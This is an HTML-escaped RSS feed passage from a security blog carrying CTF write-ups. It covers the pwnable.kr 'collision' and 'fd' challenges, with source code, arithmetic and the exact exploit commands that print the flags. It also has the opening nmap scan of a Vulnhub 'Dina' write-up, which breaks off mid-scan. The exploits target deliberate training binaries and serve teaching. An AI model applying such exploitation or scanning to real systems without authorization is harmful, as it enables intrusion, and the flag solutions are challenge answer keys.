	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;passcode length should be 20 bytes&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hashcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check_password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wrong passcode.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Firstly &lt;code class=&quot;highlighter-rouge&quot;&gt;int* ip = (int*)p;&lt;/code&gt; will cast the char, passed as the parameter into the &lt;code class=&quot;highlighter-rouge&quot;&gt;check_password&lt;/code&gt; function. In addition we know that the passcode has to be &lt;strong&gt;&lt;em&gt;20 bytes&lt;/em&gt;&lt;/strong&gt;. After doing simple mathematics, our input will have to consist of 5 integers, as the size of &lt;code class=&quot;highlighter-rouge&quot;&gt;int&lt;/code&gt; is &lt;strong&gt;&lt;em&gt;4 bytes&lt;/em&gt;&lt;/strong&gt;.  What next?&lt;/p&gt;

&lt;p&gt;Function will return the sum of these 5 integers, which is calculated by the loop. Back in the &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; function, this sum is checked for length, then compared with &lt;strong&gt;&lt;em&gt;hash&lt;/em&gt;&lt;/strong&gt; and if the answer is correct, it will view the flag for us.&lt;/p&gt;

&lt;p&gt;Let’s convert &lt;strong&gt;&lt;em&gt;hash&lt;/em&gt;&lt;/strong&gt; into the decimal number.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21DD09EC&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;568134124&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, now we can divide it into &lt;strong&gt;&lt;em&gt;5 pieces&lt;/em&gt;&lt;/strong&gt;. But as the number is not divisible by 5, we’ll have to use floor division which will truncate numbers after decimal point.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21DD09EC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;113626824&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;113626824&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;'0x6c5cec8'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now let’s use these 4 &lt;em&gt;pieces&lt;/em&gt;. We will substract them from the original hash, which will result in our fifth piece.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21DD09EC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;454507296&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;113626828&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;113626828&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;'0x6c5cecc'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Will it be true? We can check it with simple comparision operation.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6c5cec8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6c5cecc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21DD09EC&lt;/span&gt;
&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, our math worked out! Now we will only have to convert these hex values into &lt;strong&gt;&lt;em&gt;little endian&lt;/em&gt;&lt;/strong&gt;, as that’s how C stores integers. After that we’re ready to exploit this application.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;col@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./col &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;python2 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;\xc8\xce\xc5\x06&quot; * 4 + &quot;\xcc\xce\xc5\x06&quot;;'&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
daddy! I just managed to create a &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;collision :&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

</description>
        <pubDate>Fri, 24 Nov 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/pwnable.kr-collision/</link>
        <guid isPermaLink="true">http://localhost:4000/pwnable.kr-collision/</guid>
      </item>
    
      <item>
        <title>Pwnable.kr - fd</title>
        <description>&lt;p&gt;After feeling a big need to improve my knowledge of &lt;em&gt;pwnable&lt;/em&gt; category, I decided  to check out &lt;a href=&quot;http://pwnable.kr&quot; title=&quot;pwnable.kr&quot;&gt;pwnable.kr&lt;/a&gt; and start from the beginning.&lt;/p&gt;

&lt;p&gt;Here comes the &lt;strong&gt;&lt;em&gt;Toddler’s Bottle&lt;/em&gt;&lt;/strong&gt; and the first challenge - &lt;strong&gt;&lt;em&gt;fd&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Mommy! what is a file descriptor in Linux?&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In order to view the challenge, we have to connect via &lt;strong&gt;&lt;em&gt;ssh&lt;/em&gt;&lt;/strong&gt; with password &lt;strong&gt;&lt;em&gt;guest&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@main ~ % ssh fd@pwnable.kr &lt;span class=&quot;nt&quot;&gt;-p2222&lt;/span&gt;
fd@pwnable.krs password:
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;  |__|  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; /    &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| |      /  _]    |  |/ &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;|    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
|  o  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  _  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  o  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  o  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;| |     /  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;_     |  &lt;span class=&quot;s1&quot;&gt;' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /
|  |  |  `  '&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  _  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  O  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;_  __ |     &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
|  |   &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;     / |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
|__|    &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/  |__|__||__|__||_____||_____||_____||__||__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;|

- Site admin : daehee87.kr@gmail.com
- IRC : irc.netgarage.org:6667 / &lt;span class=&quot;c&quot;&gt;#pwnable.kr&lt;/span&gt;
- Simply &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;irssi&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; /usr/share/peda/peda.py&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;gdb terminal
Last login: Thu Nov 23 11:25:25 2017 from 131.202.114.32
fd@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 40
drwxr-x---  5 root   fd   4096 Oct 26  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 80 root   root 4096 Jan 11  2017 ..
d---------  2 root   root 4096 Jun 12  2014 .bash_history
&lt;span class=&quot;nt&quot;&gt;-r-sr-x---&lt;/span&gt;  1 fd_pwn fd   7322 Jun 11  2014 fd
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root   root  418 Jun 11  2014 fd.c
&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 fd_pwn root   50 Jun 11  2014 flag
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root   root  128 Oct 26  2016 .gdb_history
dr-xr-xr-x  2 root   root 4096 Dec 19  2016 .irssi
drwxr-xr-x  2 root   root 4096 Oct 23  2016 .pwntools-cache&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In this directory we have the challenge files - source code and binary. Firstly, let’s view the source to understand what’s going on.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pass argv[1] a number&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;atoi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;LETMEWIN&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;good job :)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;learn about Linux file IO&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;By reading it, we get that firstly &lt;code class=&quot;highlighter-rouge&quot;&gt;atoi( argv[1] )&lt;/code&gt; will convert the argument into the integer, then it will substract from it &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1234&lt;/code&gt;. After converting it into decimal we get number &lt;code class=&quot;highlighter-rouge&quot;&gt;4660&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1234&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;4660&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After that &lt;code class=&quot;highlighter-rouge&quot;&gt;read(fd, buf, 32)&lt;/code&gt; syscall is executed. First argument of this function &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; is the file descriptor of where to read the input. Then &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; is the character array where the read content will be stored and &lt;code class=&quot;highlighter-rouge&quot;&gt;32&lt;/code&gt; is the number of bytes to read before truncating the data. The last step compares the content of &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; with a string &lt;code class=&quot;highlighter-rouge&quot;&gt;LETMEWIN\n&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;How can we enter this string to make the condition true? Firstly, we can learn that file descriptor is simply an integer that is used to access a file, or IO resource. Read more at &lt;a href=&quot;https://en.wikipedia.org/wiki/File_descriptor&quot; title=&quot;Wikipedia&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Each Unix process should have three standard &lt;strong&gt;&lt;em&gt;POSIX&lt;/em&gt;&lt;/strong&gt; file descriptors. With respective integers &lt;strong&gt;&lt;em&gt;0&lt;/em&gt;&lt;/strong&gt; is &lt;strong&gt;&lt;em&gt;stdin&lt;/em&gt;&lt;/strong&gt;, &lt;strong&gt;&lt;em&gt;1&lt;/em&gt;&lt;/strong&gt; is &lt;strong&gt;&lt;em&gt;stdout&lt;/em&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;em&gt;2&lt;/em&gt;&lt;/strong&gt; is &lt;strong&gt;&lt;em&gt;stderr&lt;/em&gt;&lt;/strong&gt;. In our attack we’re going to use &lt;strong&gt;&lt;em&gt;stdin&lt;/em&gt;&lt;/strong&gt;, since it’s going to allow us to enter characters from the keyboard.&lt;/p&gt;

&lt;p&gt;To make the &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; equall to 0, we’re going to make the &lt;code class=&quot;highlighter-rouge&quot;&gt;atoi( argv[1] )&lt;/code&gt; equall to the &lt;code class=&quot;highlighter-rouge&quot;&gt;4660&lt;/code&gt;. Then substraction will result in 0, and the &lt;code class=&quot;highlighter-rouge&quot;&gt;read&lt;/code&gt; function will read the characters that we enter.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;fd@ubuntu:~$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here goes the flag!&lt;/p&gt;
</description>
        <pubDate>Thu, 23 Nov 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/pwnable.kr-fd/</link>
        <guid isPermaLink="true">http://localhost:4000/pwnable.kr-fd/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - Dina 1</title>
        <description>&lt;p&gt;Let’s quickly jump into another machine from Vulnhub called &lt;strong&gt;Dina&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Welcome to Dina 1.0.1

________                                                _________
\________\--------___       ___         ____----------/_________/
    \_______\----\\\\\\   //_ _ \\    //////-------/________/
        \______\----\\|| (( ~|~ )))  ||//------/________/
            \_____\---\\ ((\ = / ))) //----/_____/
                 \____\--\_)))  \ _)))---/____/
                       \__/  (((     (((_/
                          |  -)))  -  ))

This is my first Boot2Root - CTF VM. I hope you enjoy it.

if you run into any issue you can find me on Twitter: @touhidshaikh22

Contact: touhidshaikh22 at gmaill.com &amp;lt;- Feel Free to write mail

Website: http://www.touhidshaikh.com

Goal: /root/flag.txt

Level: Beginner (IF YOU STUCK ANYwhere PM me for HINT, But I don't think need any help).

Download: https://drive.google.com/file/d/0B1qWCgvhnTXgNUF6Rlp0c3Rlb0k/view

Try harder!: If you are confused or frustrated don't forget that enumeration is the key!

Feedback: This is my first boot2root - CTF Virtual Machine, please give me feedback on how to improve!

Tested: This VM was tested with:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Author: &lt;a href=&quot;https://www.vulnhub.com/author/touhid-shaikh,465/&quot;&gt;&lt;b&gt;Touhid Shaikh&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Download: &lt;a href=&quot;https://drive.google.com/file/d/0B1qWCgvhnTXgNUF6Rlp0c3Rlb0k/view&quot;&gt;&lt;b&gt;Dina&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;write-up&quot;&gt;Write-Up&lt;/h1&gt;

&lt;p&gt;Let’s begin by enumerating the ports using &lt;strong&gt;nmap&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~#  nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 10.0.2.5

Starting Nmap 7.60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-11-18 08:55 EST
NSE: Loaded 146 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:55
Completed NSE at 08:55, 0.00s elapsed
Initiating NSE at 08:55
Completed NSE at 08:55, 0.00s elapsed
Initiating ARP Ping Scan at 08:55
Scanning 10.0.2.5 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
Completed ARP Ping Scan at 08:55, 0.22s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Parallel DNS resolution of 1 host. at 08:55
Completed Parallel DNS resolution of 1 host. at 08:55, 0.00s elapsed
Initiating SYN Stealth Scan at 08:55
Scanning 10.0.2.5 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
Discovered open port 80/tcp on 10.0.2.5
